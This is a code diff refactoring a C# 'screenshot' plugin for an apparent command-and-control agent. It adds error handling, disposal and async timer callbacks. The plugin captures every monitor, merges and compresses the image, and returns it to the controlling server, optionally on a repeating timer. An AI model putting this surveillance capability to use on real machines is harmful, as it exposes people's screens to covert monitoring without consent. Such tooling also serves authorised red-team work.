@@ -1,18 +1,18 @@
-﻿using System.Drawing;
-using System.Runtime.InteropServices;
+﻿using System;
+using System.Collections.Generic;
+using System.Drawing;
 using System.IO.Compression;
+using System.Runtime.InteropServices;
+using System.Text.Json;
+using System.Threading.Tasks;
 using Agent.Interfaces;
 using Agent.Models;
 using Agent.Utilities;
 using screenshot;
-using System.Text.Json;
 
-
-//Nuget - System.drawing.common 
-//Only works on windows
 namespace Agent
 {
-    public class Plugin : IPlugin
+    public class Plugin : IPlugin, IDisposable
     {
         public string Name => "screenshot";
         private IMessageManager messageManager { get; set; }
@@ -22,29 +22,46 @@ namespace Agent
         {
             this.messageManager = messageManager;
         }
+
         public async Task Execute(ServerJob job)
         {
             ScreenshotArgs args = JsonSerializer.Deserialize<ScreenshotArgs>(job.task.parameters);
 
-            if (args.interval <= 0)
+            try
             {
-                await CaptureAndSendScreenshot(job.task.id);
-            }
-            else
-            {
-                screenshotTimer = new System.Timers.Timer(args.interval * 1000); // Convert seconds to milliseconds
-                screenshotTimer.Elapsed += (sender, e) => CaptureAndSendScreenshot(job.task.id);
-
-                // Set AutoReset to false for a one-time execution if the interval is greater than 0
-                screenshotTimer.AutoReset = args.interval > 0;
-                screenshotTimer.Enabled = true;
-                await messageManager.AddResponse(new ResponseResult
+                if (args.interval <= 0)
                 {
-                    completed = true,
-                    user_output = $"Capturing screenshots every {args.interval} seconds.",
-                    task_id = job.task.id,
-                });
+                    await CaptureAndSendScreenshot(job.task.id);
+                }
+                else
+                {
+                    screenshotTimer = new System.Timers.Timer(args.interval * 1000); // Convert seconds to milliseconds
+                    screenshotTimer.Elapsed += async (sender, e) => await CaptureAndSendScreenshot(job.task.id);
+
+                    // Set AutoReset to false for a one-time execution if the interval is greater than 0
+                    screenshotTimer.AutoReset = args.interval > 0;
+                    screenshotTimer.Enabled = true;
+                    await messageManager.AddResponse(new ResponseResult
+                    {
+                        completed = true,
+                        user_output = $"Capturing screenshots every {args.interval} seconds.",
+                        task_id = job.task.id,
+                    });
+                }
             }
+            catch (Exception ex)
+            {
+                await HandleExecutionError(job.task.id, ex);
+            }
+        }
+
+        private async Task HandleExecutionError(string task_id, Exception ex)
+        {
+            string errorMessage = $"An error occurred during the execution: {ex.Message}";
+            await messageManager.Write(errorMessage, task_id, true, "error");
+
+            // Log the error using your logger
+            // logger.LogError(errorMessage);
         }
 
         private async Task CaptureAndSendScreenshot(string task_id)
@@ -53,7 +70,6 @@ namespace Agent
             {
                 var bitmaps = ScreenCapture.Capture();
 
-                // Determine the size of the combined bitmap
                 int combinedWidth = 0;
                 int maxHeight = 0;
                 foreach (var bitmap in bitmaps)
@@ -65,10 +81,8 @@ namespace Agent
                     }
                 }
 
-                // Create a new bitmap to hold the combined image
                 var combinedBitmap = new Bitmap(combinedWidth, maxHeight);
 
-                // Draw each screen's bitmap onto the combined bitmap
                 int x = 0;
                 foreach (var bitmap in bitmaps)
                 {
@@ -79,12 +93,10 @@ namespace Agent
                     x += bitmap.Width;
                 }
 
-                // Convert to base64
                 var converter = new ImageConverter();
                 var combinedBitmapBytes = (byte[])converter.ConvertTo(combinedBitmap, typeof(byte[]));
                 byte[] outputBytes;
 
-                // Compress the image
                 using (var memoryStream = new MemoryStream())
                 {
                     using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
@@ -107,6 +119,11 @@ namespace Agent
             {
                 await messageManager.Write($"Failed to capture screenshot: {e.ToString()}", task_id, true, "error");
             }
+        }
+
+        public void Dispose()
+        {
+            screenshotTimer?.Dispose();
         }
     }
 
@@ -199,5 +216,4 @@ namespace Agent
             return monitors;
         }
     }
-
 }
